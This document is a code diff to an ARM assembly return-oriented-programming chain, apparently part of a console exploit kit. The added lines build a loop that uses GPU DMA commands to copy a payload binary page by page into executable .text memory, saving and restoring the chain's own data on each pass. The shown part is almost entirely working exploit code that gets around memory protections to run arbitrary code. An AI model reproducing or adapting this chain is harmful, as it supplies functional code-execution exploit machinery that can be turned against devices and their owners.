@@ -167,15 +167,39 @@ ROPMACRO_STACKPIVOT (ROPBUF + (ropkit_searchloop_lpstart - _start)), ROP_POPPC
 
 ropkit_searchloop_finished:
 
-@ Write the codebin into .text.
+@ Write the payload codebin into .text.
 
-@ TODO: Actually use the linearmem page array here.
+@ *ROPKIT_LINEARPAGEARRAY_CURPTR = ROPKIT_LINEARPAGEARRAY
+ROPMACRO_WRITEWORD ROPKIT_LINEARPAGEARRAY_CURPTR, ROPKIT_LINEARPAGEARRAY
 
-.word 0x50102040
+@ *(ROPKIT_TMPDATA+0x28) = ROPKIT_BINLOAD_ADDR
+ROPMACRO_WRITEWORD (ROPKIT_TMPDATA+0x28), ROPKIT_BINLOAD_ADDR
 
-CALL_GXCMD4_LDRDST ROPKIT_BINLOAD_ADDR, (ROPKIT_TMPDATA+0x28), ROPKIT_BINLOAD_SIZE
+@ Backup the ROP-chain data.
+CALLFUNC_NOSP MEMCPY, ROPKIT_ROPBAK, (ROPBUF + ((ropkit_copycodebin_lpstart) - _start)), ((ropkit_copycodebin_lpnext - ropkit_copycodebin_lpstart) + CALLFUNC_NOSP_FUNCADROFFSET), 0
 
-@ Wait 0.1s for the transfer to finish.
+ropkit_copycodebin_lpstart:
+@ Copy *ROPKIT_LINEARPAGEARRAY_CURPTR to the dstaddr used in the below macro.
+ROPMACRO_COPYWORD (ROPBUF + (ropkit_copycodebin_gxcmd4 - _start) + CALLFUNC_LDRR0R1_R1OFFSET), ROPKIT_LINEARPAGEARRAY_CURPTR
+
+ropkit_copycodebin_gxcmd4:
+CALL_GXCMD4_LDRSRCDST (ROPKIT_TMPDATA+0x28), 0, 0x1000
+
+@ Update the address used for the srcaddr.
+ROPMACRO_LDDRR0_ADDR1_STRADDR (ROPKIT_TMPDATA+0x28), (ROPKIT_TMPDATA+0x28), 0x1000
+
+@ Update the address stored at ROPKIT_LINEARPAGEARRAY_CURPTR.
+ROPMACRO_LDDRR0_ADDR1_STRADDR ROPKIT_LINEARPAGEARRAY_CURPTR, ROPKIT_LINEARPAGEARRAY_CURPTR, 0x4
+
+ropkit_copycodebin_lpnext:
+@ Restore the ROP-chain data.
+CALLFUNC_NOSP MEMCPY, (ROPBUF + ((ropkit_copycodebin_lpstart) - _start)), ROPKIT_ROPBAK, ((ropkit_copycodebin_lpnext - ropkit_copycodebin_lpstart) + CALLFUNC_NOSP_FUNCADROFFSET), 0
+ROPMACRO_WRITEWORD (ROPBUF + ((ropkit_copycodebin_lpnext - _start) + CALLFUNC_NOSP_FUNCADROFFSET)), MEMCPY @ Restore the funcaddr used above(this can't be done from the memcpy since that would overwrite the saved LR).
+
+@ If the end of the payload wasn't reached yet, jump to ropkit_copycodebin_lpstart.
+ROPMACRO_CMPDATA (ROPKIT_TMPDATA+0x28), (ROPKIT_BINLOAD_ADDR + ROPKIT_BINLOAD_SIZE), (ROPBUF + (ropkit_copycodebin_lpstart - _start))
+
+@ Wait 0.1s for the transfers to finish.
 CALLFUNC_R0R1 svcSleepThread, 100000000, 0
 
 @ Setup the paramblk.
